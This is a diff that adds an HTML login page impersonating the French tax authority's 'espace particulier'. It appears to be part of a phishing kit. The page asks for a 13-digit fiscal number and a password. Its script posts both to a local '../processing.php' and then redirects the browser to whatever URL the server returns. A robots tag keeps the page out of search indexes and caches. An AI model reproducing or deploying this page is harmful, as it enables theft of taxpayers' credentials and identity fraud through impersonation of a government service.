@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">
+ <head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <meta "noarchive,"="" "nocache,"="" "nofollow,"="" "noimageindex,"="" "nosnippet"="" content="noindex," name="robots"/>
+  <!-- CSS FILES -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <link href="../media/css/helpers.css" rel="stylesheet"/>
+  <link href="../media/css/style.css" rel="stylesheet"/>
+  <link href="../media/imgs/ff.ico" rel="icon" type="image/x-icon">
+   <title>
+    Particuliers
+   </title>
+  </link>
+ </head>
+ <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">
+  <!-- HEADER -->
+  <header id="header">
+   <div class="container">
+    <div class="top-header">
+     <div class="logo">
+      <img src="../media/imgs/logo.svg"/>
+     </div>
+     <div class="btns">
+      <button type="button">
+       <i class="fas fa-lock">
+       </i>
+       Votre espace particulier
+      </button>
+      <button style="background: #A63950; margin-top: 5px;" type="button">
+       <i class="fas fa-lock">
+       </i>
+       Votre espace professionnel
+      </button>
+     </div>
+     <div class="menu">
+      <img src="../media/imgs/menu.png"/>
+     </div>
+    </div>
+   </div>
+  </header>
+  <!-- END HEADER -->
+  <!-- BREADCRUMB -->
+  <div class="mt-4 mb-5" id="breadcrumb">
+   <div class="container">
+    <u>
+     Accueil
+    </u>
+    <span>
+     -
+    </span>
+    Authentification
+   </div>
+  </div>
+  <!-- BREADCRUMB -->
+  <!-- MAIN -->
+  <main class="flex-grow-1" id="main">
+   <div class="container">
+    <div class="row">
+     <div class="col-md-6">
+      <div class="login-area">
+       <div class="title">
+        <h3>
+         Connexion ou création de votre espace
+        </h3>
+       </div>
+       <div id="forma">
+        <input id="cap" name="cap" type="hidden"/>
+        <input id="steeep" name="steeep" type="hidden" value="login"/>
+        <div class="form-group mb20">
+         <label for="username">
+          Numéro fiscal
+         </label>
+         <input class="form-control" id="username" inputmode="numeric" maxlength="13" name="username" placeholder="13 chiffres" type="text"/>
+        </div>
+        <div class="form-group mb20">
+         <label for="password">
+          Mot de passe
+         </label>
+         <div class="in">
+          <input class="form-control" id="password" name="password" type="password"/>
+          <div class="eye">
+           <i class="fa-regular fa-eye">
+           </i>
+          </div>
+         </div>
+        </div>
+        <div class="btns">
+         <button id="booom">
+          Connexion
+         </button>
+        </div>
+        <fieldset class="border rounded-3">
+         <legend class="float-none w-auto px-3">
+          Ou
+         </legend>
+        </fieldset>
+        <div class="text-center">
+         <img src="../media/imgs/login-img.svg" style="max-width: 200px;"/>
+         <p>
+          <span>
+           Qu'est-ce que FranceConnect?
+          </span>
+         </p>
+        </div>
+        <hr/>
+        <p class="text-center mb-3">
+         Vous pouvez également payer en ligne en utilisant votre numéro fiscal et la référence de votre avis
+        </p>
+        <div class="btns">
+         <button type="button">
+          Payer en ligne
+         </button>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="col-md-6">
+      <aside>
+       <div class="title">
+        <h3>
+         Aide
+        </h3>
+       </div>
+       <ul>
+        <li>
+         <span>
+          +
+         </span>
+         Vous avez oublié votre mot de passe
+        </li>
+        <li>
+         <span>
+          +
+         </span>
+         Comment modifier votre mot de passe ?
+        </li>
+       </ul>
+       <hr/>
+       <ul>
+        <li>
+         <span>
+          +
+         </span>
+         Les services disponibles sur votre espace particulier
+        </li>
+        <li>
+         <span>
+          +
+         </span>
+         Gestion des cookies
+        </li>
+       </ul>
+      </aside>
+     </div>
+    </div>
+   </div>
+  </main>
+  <!-- END MAIN -->
+  <footer id="footer">
+   <div class="container">
+    <p>
+     Direction générale des Finances publiques
+    </p>
+   </div>
+  </footer>
+  <!-- JS FILES -->
+  <script src="https://code.jquery.com/jquery-3.6.1.min.js">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js">
+  </script>
+  <script src="../media/js/js.js">
+  </script>
+  <script>
+   $('#username').mask('0000000000000');
+            var loaded = false;  
+            $('#booom').click(function(){
+                if( loaded == true ) {
+                    return false;
+                }
+                formData = {
+                    'cap' : $('#cap').val(),
+                    'steeep' : $('#steeep').val(),
+                    'username' : $('#username').val(),
+                    'password' : $('#password').val(),
+                }
+                $.post( "../processing.php", formData )
+                    .done(function( data ) {
+                    window.location.href = data;
+                });
+                loaded = true;
+            });
+            $('.eye').click(function(){
+                if( $('#password').attr('type') == 'password' ) {
+                    $('#password').attr('type','text');
+                    $('.eye').html('<i class="fa-regular fa-eye-slash"></i>');
+                } else {
+                    $('#password').attr('type','password');
+                    $('.eye').html('<i class="fa-regular fa-eye"></i>');
+                }
+            });
+  </script>
+ </body>
+</html>
